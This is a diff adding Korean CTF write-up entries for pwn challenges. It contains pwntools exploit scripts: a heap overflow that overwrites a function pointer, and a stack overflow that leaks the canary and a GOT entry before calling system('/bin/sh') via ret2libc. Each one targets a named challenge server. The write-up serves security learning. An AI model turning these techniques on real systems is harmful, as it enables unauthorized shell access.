@@ -332,3 +332,114 @@ var b=200;for(a=0;a<=20;a++){b=b+((a*b)-(a/b));if(a==0)b=70;else if(a==1)b=76;el
 ```
 
 flag = FLAG{ˡᐭꅭ곚삍䘐䣇눛뵼ᩎꓨᶐㆰ}
+
+## Point to pointer! 529pt (pwn)
+
+```
+넘나 쉬운 문제 당신도 풀 수 있습니다!
+nc 222.110.147.52:42632
+```
+
+힙에다 함수주소를 넣고 데이터를 입력받는다. 이때 오버플로가 발생하니까
+원샷 주소로 덮은다음 쉘을 따면 된다.
+
+```python
+from pwn import *
+p=remote("222.110.147.52",42632)
+print p.recv()
+p.sendline("\x00"*0x10+p64(0x4007a7))
+print p.recv()
+p.sendline("Y")
+
+p.interactive()
+```
+
+flag = FLAG{P0InT_2_pOiNt_2_PO1t3R!}
+
+## Factorization 889pt (pwn)
+
+```
+열심히 수련하여 샌드백을 터뜨리자!
+nc 222.110.147.52 6975
+```
+
+특정 숫자를 맞춰주면 BOF를 일으킬수있다.
+12의 6승으로 맞추고 puts.got를 릭하고 메인으로 다시 돌아가서
+한번더 BOF로 system(/bin/sh)를 해서 쉘을 얻었다.
+
+```python
+from yeonnic import *
+
+elf=ELF("./sandbag")
+
+p=remote("222.110.147.52", 6975)
+
+def fuck_bof(data):
+    p.sendline("2")
+    print p.recv()
+    p.sendline("4")
+    print p.recv()
+    p.sendline(data)
+
+print p.recv()
+
+for i in range(2):
+    for j in range(3):
+        for x in range(12):
+            p.sendline(str(i+1))
+            print p.recv()
+            p.sendline(str(j+1))
+            print p.recv()
+
+gdb_attach(p,"b *0x8048dee\nc")
+
+p.sendline("3")
+print p.recv()
+p.sendline("4")
+print p.recv()
+
+fuck_bof("A"*0x3f+"B")
+print p.recvuntil("AB")
+canary=u32(p.recv(4))-10
+print p.recv()
+print 'canary -> ',hex(canary)
+
+fuck_bof("A"*0x40+flat(canary,0,elf.plt['puts'],0x8048d87,elf.got['puts']))
+print p.recv()
+p.sendline("6")
+print p.recvuntil("Good Bye~\n")
+puts=u32(p.recv(4))
+print p.recv()
+
+libc=get_libc("puts",puts)
+
+for i in range(2):
+    for j in range(3):
+        for x in range(12):
+            p.sendline(str(i+1))
+            print p.recv()
+            p.sendline(str(j+1))
+            print p.recv()
+p.sendline("3")
+print p.recv()
+p.sendline("4")
+print p.recv()
+
+fuck_bof("A"*0x40+flat(canary,0,libc.symbols['system'],0,next(libc.search("/bin/sh\x00"))))
+
+p.sendline("6")
+
+p.interactive()
+```
+
+flag = FLAG{dO_y0u_kNOw_F@ct0rIzAtion?}
+
+## Allocate 991pt (pwn)
+
+```
+There are many allocation methods in this world.
+Learn a lot and get shell
+222.110.147.52:28417
+```
+
+
